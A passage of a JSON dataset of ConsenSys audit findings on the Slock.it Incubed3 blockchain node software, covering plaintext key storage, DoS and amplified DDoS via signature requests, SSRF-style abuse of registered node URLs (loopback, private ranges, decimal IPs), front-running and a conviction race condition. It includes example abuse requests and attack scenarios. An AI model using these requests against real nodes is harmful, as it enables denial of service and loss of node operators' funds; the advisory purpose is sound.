      "summary": "\n\nThis bug report is about secure and efficient key management in the in3-server application. It is a challenge for any cryptographic system, as an attacker that is able to discover the keys used by an `in3-server` by any mechanism may be able to impersonate that node, steal the nodes funds or sign wrong data on behalf of the node which might also lead to a loss of funds.\n\nThe private key for the `in3-server` can be specified in a configuration file called `config.json` residing in the program working dir. Settings from the `config.json` can be overridden via command-line options. The application keeps configuration parameters available internally in an `IN3RPCConfig` object and passes this object as an initialization parameter to other objects.\n\nThe key can either be provided in plaintext as a hex-string starting with `0x` or within an ethereum keystore format compatible protected keystore file. Either way it is provided it will be held in plaintext in the object.\n\nThe application accepts plaintext private keys and the keys are stored unprotected in the applications memory in JavaScript objects. The `in3-server` might even re-use the nodes private key which may weaken the security provided by the node. The repository leaks a series of presumably â€˜test private keysâ€™ and the default config file already comes with a private key set that might be shared across unvary users that fail to override it.\n\nThe breakdown of the fixes addressed with [git.slock.it/PR/13](https://git.slock.it/in3/ts/in3-server/merge_requests/113) are as follows:\n\n* Keys should never be stored or accepted in plaintext format. Keys should only be accepted in an encrypted and protected format.\n* A single key should be used for only one purpose. Keys should not be shared.\n* The application should support developers in understanding where cryptographic keys are stored within the application as well as in which memory regions they might be accessible for other applications.\n* Keys should be protected in memory and only decrypted for the duration of time they are actively used. Keys should not be stored with the applications source-code repository.\n* Use standard libraries for cryptographic operations.\n* Use the system keystore and API to sign and avoid to store key material at all.\n",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13963",
      "title": "in3-server - DoS on in3.sign and other requests âœ“Â Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nSimilar to <https://github.com/ConsenSys/slockit-in3-audit-2019-09/issues/50,> Mitigated by adding `maxBlocksSigned` and `maxSignatures` for requests of any client. â€œThe Numbers of signatures a client can ask to fetch is now limited to maxSignatures which defaults to 5â€ in [merge\\_requests/101](https://git.slock.it/in3/ts/in3-server/merge_requests/101). The full extent of this fix is outside the scope of this audit.\n\n\n\n> \n> We have limited the number of block you can ask to sign in the in3\\_sign-request. The default is 10, because this function is also used for eth\\_getLogs to provide proof for all events. This limit will also limit the result of logs returned to include only max 10 different blocks.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nIt is free for the client to ask the nodes to sign block hashes (and also other requests).\n`in3.sign([{\"blockNumber\": 123}])` Takes an array of objects that will result in multiple requests in the node. This sample request has (at least) two internal requests, one `eth_getBlockByNumber` and signing the block hash.\n\n\nThese requests can be continuously sent out to clients and result in using computation power of the nodes without any expense from the client.\n\n\n#### Examples\n\n\nRequest to get and sign the first 200 blocks:\n\n\n`web3.manager.request_blocking(\"in3_sign\", [{'blockNumber':i} for i in range(200)])`\n\n\n#### Recommendation\n\n\nLimit the number of blocks (input), or do not accept arrays for input.",
      "summary": "\nBug report summary: This bug report is about the risk of a client continuously sending requests to nodes without any expense from the client. The requests ask the nodes to sign block hashes and other requests, which can result in using computation power of the nodes. An example of this is a request to get and sign the first 200 blocks. As a resolution, the number of signatures a client can ask to fetch is now limited to a maximum of 5, as default. Additionally, the maximum blocks signed is also limited. Recommendations are to limit the number of blocks (input), or not accept arrays for input.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13962",
      "title": "in3-server - should protect itself from abusive clients âœ“Â Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nSlockit implemented their own DOS protection for incubed server in [merge\\_requests/99](https://git.slock.it/in3/ts/in3-server/merge_requests/99). The variant of this implementation adds more complexity to the code base. The benchmark and testing of the new DOS protection is not in scope for this audit.\n\n\n\n> \n> The incubed server has now an additional DOS-Protection build in.\n> Here we first estimate a Weight of such a request and add them together for all incoming requests per IP of the client per Minute.\n> Since we estimate the execution, we can prevent a client running DOS-Attacks from the same IP with heavy requests (such as eth\\_getLogs)\n> \n> \n> \n\n\n\n\n#### Description\n\n\nThe in3-node implementation should provide features for client request throttling to avoid that a client can consume most of the nodes resources by causing a lot of resource intensive requests.\n\n\nThis is a general problem to the system which is designed to make sure that low resource clients can verify blockchain properties. What this means is that almost all of the client requests are very lightweight. Clients can request nodes to sign data for them. A sign request involves cryptographic operations and a http-rpc request to a back-end blockchain node. The imbalance is clearly visible in the case of blockProofs where a client may request another node to interact with a smart contract (NodeRegistry) and ask other nodes to sign blockhashes. All other nodes will have to get the requested block data from their local blockchain nodes and the incubed node requesting the signatures will have to wait for all responses. The client instead only has to send out that request once and may just leave that tcp connection open. It might even consume more resources from a specific node by requesting the same signatures again and again not even waiting for a response but causing a lot of work on the node that has to collect all the signatures. This combined with unbound requests for signatures or other properties can easily be exploited by a powerful client implementation with a mission to stall the whole incubed network.\n\n\n#### Recommendation\n\n\nAccording to the threat model outlines a general DDoS scenario specific to rpcUrls. It discusses that the nodes are themselves responsible for DDoS protection. However, DDoS protection is a multi-layer approach and it is highly unlikely that every node-operator will hide their nodes behind a DDoS CDN like cloudflare. We therefore suggest to also build in strict limitations for clients that can be checked in code. Similar to `checkPerformanceLimits` which is just checking for some specific it is suggested to implement a multi-layer throttling mechanism that prevents nodes from being abused by single clients. Methods must be designed with (D)DoS scenarios in mind to avoid that third parties are abusing the network for DDoS campaigns or trying to DoS the incubed network.\n\n\n**code/in3-server/src/modules/eth/EthHandler.ts:L74-L91**\n\n\n\n```\nprivate checkPerformanceLimits(request: RPCRequest) {\n  if (request.method === 'eth\\_call') {\n    if (!request.params || request.params.length < 2) throw new Error('eth\\_call must have a transaction and a block as parameters')\n    const tx = request.params as TxRequest\n    if (!tx || (tx.gas && toNumber(tx.gas) > 10000000)) throw new Error('eth\\_call with a gaslimit > 10M are not allowed')\n  }\n  else if (request.method === 'eth\\_getLogs') {\n    if (!request.params || request.params.length < 1) throw new Error('eth\\_getLogs must have a filter as parameter')\n    const filter: LogFilter = request.params[0]\n    let toB = filter && filter.toBlock\n    if (toB === 'latest' || toB === 'pending' || !toB) toB = this.watcher && this.watcher.block && this.watcher.block.number\n    let fromB = toB && filter && filter.fromBlock\n    if (fromB === 'earliest') fromB = 1;\n    const range = fromB && (toNumber(toB) - toNumber(fromB))\n    if (range > (request.in3.verification.startsWith('proof') ? 1000 : 10000))\n      throw new Error('eth\\_getLogs for a range of ' + range + ' blocks is not allowed. limits: with proof: 1000, without 10000 ')\n  }\n}\n\n```\n* implement request throttling per client\n* implement caching mechanism for similar requests if it is expected that the same response is to be delivered multiple times\n* implement general performance limits and reject further requests if the node is close to exhausting its resources (soft DoS)\n* make sure the node does not exhaust the systems resources\n* implement throttling per request method\n* design methods to prevent (D)DoS in the first place. Methods that allow a client to send one request that causes a node to perform multiple client controlled requests must be avoided or at least bound and throttled (<https://github.com/ConsenSys/slockit-in3-audit-2019-09/issues/51,> <https://github.com/ConsenSys/slockit-in3-audit-2019-09/issues/50)>.",
      "summary": "\nSlockit has implemented a DOS protection for their incubed server, which adds complexity to the code base. This audit does not cover the benchmarking and testing of the new DOS protection. The in3-node implementation should provide features for client request throttling to avoid that a client can consume most of the nodes resources by causing a lot of resource intensive requests. This is to make sure that low resource clients can verify blockchain properties. To prevent (D)DoS, methods must be designed in mind to avoid that third parties are abusing the network. Suggestions include implementing request throttling per client, a caching mechanism for similar requests, general performance limits, and throttling per request method.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13961",
      "title": "Malicious clients can use forks or reorgs to convict honest nodes Â Won't Fix",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nDefault value for past signed blocks is changed to 10 blocks. Slockit plans to use their off-chain channels to notify clients for planned forks. They also looking into using fork oracles in the future releases to detect planned hardforks to mitigate risks.\n\n\n#### Description\n\n\nIn case of reorgs it is possible to have more than 6 blocks in a node that gets replaced by a new longer chain. Also for forks, such as upcoming [Istanbul fork](https://blog.infura.io/were-ready-for-the-istanbul-fork-e39afc2b1412), itâ€™s common to have some nodes taking some time to update and they will be in the wrong chain for the time being. In both cases, in3-nodes are prone to sign blocks that are considered invalid in the main chain.\nMalicious nodes can catch these instances and convict the honest users in the main chain to get 50% of their deposits.\n\n\n#### Recommendation\n\n\nNo perfect solution comes to mind at this time. One possible mitigation method for forks could be to disable the network on the time of the fork but this is most certainly going to be a threat to the system itself.",
      "summary": "\nThis bug report describes a potential security risk in the Slockit system. It is possible for a malicious node to take advantage of reorgs and forks, where some nodes are on the wrong chain, to convict honest users in the main chain and get 50% of their deposits. To mitigate this risk, the default value for past signed blocks has been changed to 10 blocks. Slockit is also looking into using off-chain channels to notify clients for planned forks and fork oracles in future releases. However, no perfect solution has been identified yet. One possible mitigation method is to disable the network on the time of a fork, but this could be a threat to the system itself.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [
        "Chain Reorganization Attack"
      ],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13960",
      "title": "NodeRegistry - URL can be arbitrary dns resolvable names, IPâ€™s and even localhost or private subnets âœ“Â Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nThis issue has been addressed with the following commits:\n\n\n* [4c93a10f](https://git.slock.it/in3/c/in3-core/commit/8cc4dbc02cb3b0d2fb8718e47aca1c4d11dffdc0) adding 48 hours delay in the server code before they communicate with the newly registered nodes.\n* [merge\\_requests/111](https://git.slock.it/in3/ts/in3-server/merge_requests/111) adding a whole new smart contract to the IN3 system, `IN3WhiteList.sol`, and supporting code in the server.\n* [issues/94](https://git.slock.it/in3/c/in3-core/issues/94#note_16265) To prevent attacker to use nodes as a DoS network, a DNS record verification is discussed to be implemented.\n\n\nIt is a design decision to base the Node registry on URLs (DNS resolvable names). This has the implications outlined in this issue and they cannot easily be mitigated. Adding a delay until nodes can be used after registration only delays the problem. Assuming that an entity curates the registry or a whitelist is in place centralizes the system. Adding DNS record verification still allows an owner of a DNS entry to point its name to any IP address they would like it to point to. It certainly makes it harder to add RPC URLs with DNS names that are not in control of the attacker but it also adds a whole lot more complexity to the system (including manual steps performed by the node operator). In the end, the system allows IP based URLs in the registry which cannot be used for DNS validation.\n\n\nNote that the server code changes, and the new smart contract `IN3WhiteList.sol` are outside the scope of the original audit. We strongly recommend to reduce complexity and audit the final codebase before mainnet deployment.\n\n\n\n\n#### Description\n\n\nAs outlined in [issue 6.9](#noderegistry---multiple-nodes-can-share-slightly-different-rpc-url) the `NodeRegistry` allows anyone to register nodes with arbitrary URLs. The `url` is then used by `in3-server` or clients to connect to other nodes in the system. Signers can only be convicted if they sign wrong blockhashes. However, if they never provide any signatures they can stay in the registry for as long as they want and sabotage the network.\nThe Registry implements an admin functionality that is available for the first year to remove misbehaving nodes (or spam entries) from the Registry. However, this is insufficient as an attacker might just re-register nodes after the minimum timeout they specify or spend some more finneys on registering more nodes. Depending on the eth-price this will be more or less profitable.\n\n\nFrom an attackers perspective the `NodeRegistry` is a good source of information for reconnaissance, allows to de-anonymize and profile nodes based on dns entries or netblocks or responses to `in3_stats` (<https://github.com/ConsenSys/slockit-in3-audit-2019-09/issues/49),> makes a good list of target for DoS attacks on the system or makes it easy to exploit nodes for certain yet unknown security vulnerabilities.\n\n\nSince nodes and potentially clients (not in scope) do not validate the rpc URL received from the `NodeRegistry` they will try to connect to whatever is stored in a nodes `url` entry.\n\n\n**code/in3-server/src/chains/signatures.ts:L58-L75**\n\n\n\n```\nconst config = nodes.nodes.find(\\_ => \\_.address.toLowerCase() === adr.toLowerCase())\nif (!config) // TODO do we need to throw here or is it ok to simply not deliver the signature?\n  throw new Error('The ' + adr + ' does not exist within the current registered active nodeList!')\n\n// get cache signatures and remaining blocks that have no signatures\nconst cachedSignatures: Signature[] = []\nconst blocksToRequest = blocks.filter(b => {\n  const s = signatureCaches.get(b.hash) && false\n  return s ? cachedSignatures.push(s) \\* 0 : true\n})\n\n// send the sign-request\nlet response: RPCResponse\ntry {\n  response = (blocksToRequest.length\n    ? await handler.transport.handle(config.url, { id: handler.counter++ || 1, jsonrpc: '2.0', method: 'in3\\_sign', params: blocksToRequest })\n    : { result: [] }) as RPCResponse\n  if (response.error) {\n\n```\nThis allows for a wide range of attacks not limited to:\n\n\n* An attacker might register a node with an empty or invalid URL. The `in3-server` does not validate the URL and therefore will attempt to connect to the invalid URL, spending resources (cpu, file-descriptors, ..) to find out that it is invalid.\n* An attacker might register a node with a URL that is pointing to another nodeâ€™s rpc endpoint and specify weights that suggest that it is capable of service a lot of requests to draw more traffic towards that node in an attempt to cause a DoS situation.\n* An attacker might register a node for a http/https website at any port in an extortion attempt directed to website owners. The incubed network nodes will have to learn themselves that the URL is invalid and they will at least attempt to connect the website once.\n* An attacker might update the node information in the `NodeRegistry` for a specific node every block, providing a new `url` (or a slightly different URLs [issue 6.9](#noderegistry---multiple-nodes-can-share-slightly-different-rpc-url)) to avoid client/node URL blacklists.\n* An attacker might provide IP addresses instead of DNS resolvable names with the `url` in an attempt to draw traffic to targets, avoiding canonicalization and blacklisting features.\n* An attacker might provide a URL that points to private IP netblocks for IPv4 or IPv6 in various formats. Combined with the ability to ask another node to connect to an attacker defined `url` (via blockproof, `signatures[] -> signer_address -> signer.url`) this might allow an attacker to enumerate services in the LAN of node operators.\n* An attacker might provide the loopback IPv4, IPv6 or resolvable name as the URL in an attempt to make the node connect to local loopback services (service discovery, bypassing authentication for some local running services - however this is very limited to the requests nodes may execute).\n* URLs may be provided in various formats: resolvable dns names, IPv4, IPv6 and depending on the http handler implementation even in Decimal, Hex or Octal form (i.e. http://2130706433/)\n* A valid DNS resolvable name might point to a localhost or private IP netblock.\n\n\nSince none of the rpc endpoints provide signatures they cannot be convicted or removed (unless the `unregisterKey` does it within the first year. However, that will not solve the problem that someone can re-register the same URLs over and over again)\n\n\n#### Recommendation\n\n\nIt is a fundamental design decision of the system architecture to allow rpc urls in the Node Registry, therefore this issue can only be partially mitigated unless the system design is reworked. It is therefore suggested to add checks to both the registry contract (coarse validation to avoid adding invalid urls) and node implementations (rigorous validation of URLâ€™s and resolved IP addresses) and filter out any potentially harmful destinations.",
      "summary": "\nThe NodeRegistry in the IN3 system allows anyone to register nodes with arbitrary URLs. These URLs are used by in3-server or clients to connect to other nodes in the system. However, this can be abused by an attacker who can register nodes with empty or invalid URLs, register nodes with URLs pointing to another nodeâ€™s RPC endpoint, register nodes with URLs pointing to websites, or register nodes with IP addresses. These attacks can be used for reconnaissance, de-anonymizing and profiling nodes, DoS attacks, or exploiting nodes for security vulnerabilities.\n\nTo mitigate these attacks, the system should add checks to both the registry contract and node implementations to filter out any potentially harmful destinations. This includes coarse validation to avoid adding invalid URLs, and rigorous validation of URLs and resolved IP addresses. Additionally, a delay should be added before nodes can be used after registration, and a DNS record verification should be implemented. Finally, the system should reduce complexity and audit the final codebase before mainnet deployment.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13959",
      "title": "NodeRegistry Front-running attack on convict() âœ“Â Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nBlocknumber is removed from `convict` function, which removes any signal for an attacker in the scenario provided. However, the order of the transactions to convict a wrong signed hash is necessary to prevent any front-running attacks:\n\n\n1. Convict(\\_Blockhash)\n2. recreate Blockheaders\n3. RevealConvict (minimum 2 blocks after `convict` but as soon as recreateBlockheaders is confirmed)\n\n\nThe fixes were introduced in [ecf2c6a6](https://git.slock.it/in3/in3-contracts/commit/ecf2c6a6c2356b068c3966db0985b762ea822ca0) and [f4250c9a](https://git.slock.it/in3/in3-contracts/commit/f4250c9a7d9a493d77e2ccd07610d145bc67c48c), although later on NodeRegistry contract was split in two other contracts `NodeRegistryLogic` and `NodeRegistryData` and further changes were done in the conviction flow in different commits.\n\n\n\n\n#### Description\n\n\n`convict(uint _blockNumber, bytes32 _hash)` and `revealConvict()` are designed to prevent front-running and they do so for the purpose they are designed for. However, if the malicious node, is still sending out the wrong blockhash for the convicted block, anyone seeing the initial convict transaction, can check the convicted blocknumber with the nodes and send his own `revealConvict` before the original sender.\n\n\nThe original sender will be the one updating the block headers `recreateBlockheaders(_blockNumber, _blockheaders)`, and the attacker can just watch for the update headers to perform this attack.\n\n\n#### Recommendation\n\n\nFor the first attack vector, remove the blocknumber from the `convict(uint _blockNumber, bytes32 _hash)` inputs and just use the hash.",
      "summary": "\nThis bug report concerns the security of the `convict` and `revealConvict` functions in the NodeRegistry contract. These functions are designed to prevent front-running, however, if a malicious node is sending out the wrong blockhash for the convicted block, an attacker could check the convicted blocknumber with the nodes and send their own `revealConvict` before the original sender. To prevent this, the blocknumber has been removed from the `convict` function and further changes were made to the conviction flow. This should make it more difficult for attackers to front-run and successfully execute an attack.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13958",
      "title": "BlockProof - Node conviction race condition may trick all but one node into losing funds âœ“Â Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nMitigated by:\n\n\n* [80bb6ecf](https://git.slock.it/in3/in3-contracts/commit/80bb6ecf19ec4cbc2de0367c4c5dc31661533689) by checking if blockhash exists and prevent an overwrite, saving gas\n* Client will blacklist the server if the signature is missing, has a wrong signer or is invalid.\n* [6cc0dbc0](https://git.slock.it/in3/ts/in3-server/commit/6cc0dbc033b7c134d889dbdce3f21029c76ada33) Removing nodes from local available nodes list when the server detects wrong responses\n* Other commits to mitigate the mentioned vulnerable scenarios\n\n\n\n> \n> With the new handling, the client will not call convict immediately (as this could be exploited again). Instead, the client will do the calculation whether itâ€™s worth convicting the server before even calling convict.\n> \n> \n> \n\n\nIt should be noted that the changes are scattered and modified in the final source code, and this behaviour of IN3-server code is outside the [scope of this audit](#audit-scope).\n\n\n\n\n#### Description\n\n\nTLDR; One node can force all other nodes to convict a specific malicious signer controlled by the attacker and spend gas on something they are not going to be rewarded for. The attacker loses `deposit` but all other nodes that try to convict and recreate in the same block will lose the fees less or equal to `deposit/2`. Another variant forces the same node to recreate the blockheaders multiple times within the same block as the node does not check if it is already convicting/recreating blockheaders.\n\n\nNodes can request various types of [proofs](https://in3.readthedocs.io/en/develop/spec.html#proofs) from other nodes. For example, if a node requests a proof when calling one of the `eth_getBlock*` methods, the `in3-server`â€™s method `handleBlock` will be called. The request should contain a list of addresses registered to the NodeRegistry that are requested to sign the blockhash.\n\n\n**code/in3-server/src/modules/eth/EthHandler.ts:L105-L112**\n\n\n\n```\n// handle special jspn-rpc\nif (request.in3.verification.startsWith('proof'))\n  switch (request.method) {\n    case 'eth\\_getBlockByNumber':\n    case 'eth\\_getBlockByHash':\n    case 'eth\\_getBlockTransactionCountByHash':\n    case 'eth\\_getBlockTransactionCountByNumber':\n      return handleBlock(this, request)\n\n```\n`in3-server` will subsequently reach out to itâ€™s connected blockchain node execute the `eth_getBlock*` call to get the block data. If the block data is available the `in3-server`, it will try to collect signatures from the nodes that signature was requested from (`request.in3.signatures`, `collectSignatures()`)\n\n\n**code/in3-server/src/modules/eth/proof.ts:L237-L243**\n\n\n\n```\n// create the proof\nresponse.in3 = {\n  proof: {\n    type: 'blockProof',\n    signatures: await collectSignatures(handler, request.in3.signatures, [{ blockNumber: toNumber(blockData.number), hash: blockData.hash }], request.in3.verifiedHashes)\n  }\n}\n\n```\nIf the node does not find the address it will throw an exception. Note that if this exception is not caught it will actually allow someone to boot nodes off the network - which is critical.\n\n\n**code/in3-server/src/chains/signatures.ts:L58-L60**\n\n\n\n```\nconst config = nodes.nodes.find(\\_ => \\_.address.toLowerCase() === adr.toLowerCase())\nif (!config) // TODO do we need to throw here or is it ok to simply not deliver the signature?\n  throw new Error('The ' + adr + ' does not exist within the current registered active nodeList!')\n\n```\nIf the address is valid and existent in the `NodeRegistry` the `in3-node` will ask the node to sign the blockhash of the requested blocknumber:\n\n\n**code/in3-server/src/chains/signatures.ts:L69-L84**\n\n\n\n```\n// send the sign-request\nlet response: RPCResponse\ntry {\n  response = (blocksToRequest.length\n    ? await handler.transport.handle(config.url, { id: handler.counter++ || 1, jsonrpc: '2.0', method: 'in3\\_sign', params: blocksToRequest })\n    : { result: [] }) as RPCResponse\n  if (response.error) {\n    //throw new Error('Could not get the signature from ' + adr + ' for blocks ' + blocks.map(\\_ => \\_.blockNumber).join() + ':' + response.error)\n    logger.error('Could not get the signature from ' + adr + ' for blocks ' + blocks.map(\\_ => \\_.blockNumber).join() + ':' + response.error)\n    return null\n  }\n} catch (error) {\n  logger.error(error.toString())\n  return null\n}\n\n\n```\nFor all the signed blockhashes that have been returned the `in3-server` will subsequently check if one of the nodes provided a wrong blockhash.\n\n\nWe note that nodes might:\n\n\n* decided to not follow the `in_3sign` request and just not provide a signed response\n* a node might sign with a different key\n* a node might sign a different blockheader\n* a node might sign a previous blocknumber\n\n\nIn all these cases, the node will not be convicted, even though it was able to request other nodes to perform work.\n\n\nIf another node signed a wrong blockhash the `in3-server` will automatically try to convict it. If the block is within the most recent 255 it will directly call `convict()` on the NodeRegistry (takes less gas). if it is an older block, it will try to recreate the blockchain in the `RlockhashRegistry` (takes more gas).\n\n\n**code/in3-server/src/chains/signatures.ts:L128-L152**\n\n\n\n```\nconst convictSignature: Buffer = keccak(Buffer.concat([bytes32(s.blockHash), address(singingNode.address), toBuffer(s.v, 1), bytes32(s.r), bytes32(s.s)]))\n\nif (diffBlocks < 255) {\n\n  await callContract(handler.config.rpcUrl, nodes.contract, 'convict(uint,bytes32)', [s.block, convictSignature], {\n    privateKey: handler.config.privateKey,\n    gas: 500000,\n    value: 0,\n    confirm: true                       // we are not waiting for confirmation, since we want to deliver the answer to the client.\n  })\n\n  handler.watcher.futureConvicts.push({\n    convictBlockNumber: latestBlockNumber,\n    signer: singingNode.address,\n    wrongBlockHash: s.blockHash,\n    wrongBlockNumber: s.block,\n    v: s.v,\n    r: s.r,\n    s: s.s,\n    recreationDone: true\n  })\n}\nelse {\n  await handleRecreation(handler, nodes, singingNode, s, diffBlocks)\n}\n\n```\nThe recreation and convict is only done if it is profitable for the node. (Note the issue mentioned in [issue 6.13](#in3-server---handlerecreation-tries-to-recreate-blockchain-if-no-block-is-available-to-recreate-it-from))\n\n\n**code/in3-server/src/chains/signatures.ts:L209-L213**\n\n\n\n```\nconst costPerBlock = 86412400000000\nconst blocksMissing = latestSS - s.block\nconst costs = blocksMissing \\* costPerBlock \\* 1.25\n\nif (costs > (deposit / 2)) {\n\n```\nA malicious node can exploit the hardcoded profit economics and the fact that `in3-server` implementation will try to auto-convict nodes in the following scenario:\n\n\n* malicious node requests a blockproof with an `eth_getBlock*` call from the victim node (`in3-server`) for a block that is not in the most recent 256 blocks (to maximize effort for the node). This equals to spending more gas in order to convict the node (`costs <= (deposit / 2)`).\n* the malicious node prepares the `BlockhashRegistry` to contain a blockhash that would maximize the gas needed to convict the malicious node (can be calculated offline; must fulfill `costs <= (deposit /2)`.\n* with the blockproof request the malicious node asks the `in3-server` to get the signature from a specific signer. The signer will also be malicious and is going to sign a wrong blockhash with a valid signature.\n* the malicious signer is going to lose itâ€™s deposit but the deposit also incentivizes other nodes to spend gas on the conviction process. The higher the deposit, the more an `in3-server` is willing to spend on the conviction.\n\n\nIn this scenario one malicious node tries to trick another node into convicting a malicious signer while having to spend the maximum amount of gas to make it profitable for the node.\n\n\nThe problem is, that the malicious node can ask multiple (or even all other nodes in the registry) to provide a blockproof and ask the malicious signer for a signed blockhash. All nodes will come to the conclusion that the signer returned an invalid hash and will try to convict the node. They will try to recreate the blockchain in the `BlockhashRegistry` for a barely profitable scenario. Since `in3-nodes` do not monitor the tx-pool they will not know that other nodes are already trying to convict the node. All nodes are going to spend gas on recreating the same blockchain in the `BlockhashRegistry` leading to all but the first transaction in the block to lose funds (up to `deposit/2` based on the hardcoded `costPerBlock`)\n\n\nAnother variant of the same issue is that nodes do not check if they already convicted another node (or recreated blockheaders). An attacker can therefore force a specific node to convict a malicious node multiple times before the nodes transactions are actually in a block as the nodes does not check if it is already convicting that node. The node might lose gas on the recreation/conviction process multiple times.\n\n\n#### Recommendation\n\n\nTo reduce the impact of multiple nodes trying to update the blockhashRegistry at the same time and avoid nodes losing gas by recreating the same blocks over and over again, the `BlockhashRegistry` should **require** that the target blockhash for the blocknumber does not yet exist in the registry (similar to the issue mentioned in <https://github.com/ConsenSys/slockit-in3-audit-2019-09/issues/24)>.",
      "summary": "\nIN3-server is a node-based blockchain protocol that allows nodes to request various types of proofs from other nodes. It was found that one node can force other nodes to convict a malicious signer controlled by the attacker and spend gas on something they are not going to be rewarded for. This is done by the malicious node requesting a blockproof with an `eth_getBlock*` call from the victim node for a block that is not in the most recent 256 blocks. The malicious node then prepares the `BlockhashRegistry` to contain a blockhash that would maximize the gas needed to convict the malicious node. The malicious signer will then sign a wrong blockhash with a valid signature, which will lead to other nodes trying to convict the node, spending gas on recreating the same blockchain in the `BlockhashRegistry` and losing funds (up to `deposit/2`). Another variant of the same issue is that nodes do not check if they already convicted another node, allowing an attacker to force a specific node to convict a malicious node multiple times. \n\nTo reduce the impact of multiple nodes trying to update the blockhashRegistry at the same time and avoid nodes losing gas by recreating the same blocks over and over again, the `BlockhashRegistry` should require that the target blockhash for the blocknumber does not yet exist in the registry. This was mitigated by checking if blockhash exists and prevent an overwrite, saving gas and blacklisting the server if the signature is missing, has a wrong signer or is invalid. Other commits were also made to mitigate the mentioned vulnerable scenarios.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13957",
      "title": "in3-server - amplified DDoS on incubed requests on proof with signature âœ“Â Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nMitigated by adding `maxBlocksSigned` and `maxSignatures` for requests of any client. â€œThe Numbers of signatures a client can ask to fetch is now limited to maxSignatures which defaults to 5â€ in [merge\\_requests/101](https://git.slock.it/in3/ts/in3-server/merge_requests/101). The full extent of this fix is outside the scope of this audit.\n\n\n#### Description\n\n\nIt is possible for a client to send a request to each node of the network to request a signature with proof for every other node in the network. This can result in DDoSing the network as there are no costs for the client to request this and client can send the same request to all the nodes in the network, resulting in `n^2` requests.\n\n\n#### Examples\n\n\n1. Client asks each node for `in3_nodeList` to get all the signer addresses, this could also be done using `NodeRegistry` contract\n2. Client asks each node for a proof with signature, e.g.:\n\n\n\n```\n{\n    \"jsonrpc\": \"2.0\",\n    \"id\": 2,\n    \"method\": \"eth\\_getTransactionByHash\",\n    \"params\": [\"0xf84cfb78971ebd940d7e4375b077244e93db2c3f88443bb93c561812cfed055c\"],\n    \"in3\": {\n        \"chainId\": \"0x1\",\n        \"verification\": \"proofWithSignature\",\n        \"signatures\":[\"0x784bfa9eb182C3a02DbeB5285e3dBa92d717E07a\", ALL OTHER SIGNERS HERE]\n  }\n}\n\n```\nAll the nodes are now sending requests to each other with signature required which is an expensive computation. This can go on for more transactions (or blocks, or other Eth\\_ requests) and can result in DDoS of the network.\n\n\n#### Recommendation\n\n\nLimit the number of signers in proof with signature requests. Also exclude self.signer from the list. This combined with the remediation of [issue 6.6](#in3-server---should-protect-itself-from-abusive-clients) can partially mitigate the attack vector.",
      "summary": "\nA bug was discovered in the IN3 Server that allowed clients to send requests to each node of the network, resulting in a Distributed Denial of Service attack (DDoS). This bug was caused by a lack of limitations on the number of signatures a client could request, which resulted in many requests being sent to each node in the network, resulting in a n^2 number of requests. To fix this bug, the number of signatures a client can ask to fetch has been limited to a default of 5, and the self-signer has been excluded from the list. Additionally, a fix for issue 6.6 has been implemented to partially mitigate this attack vector.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "11897",
      "title": "Inconsistent coding style among different files",
      "impact": "LOW",
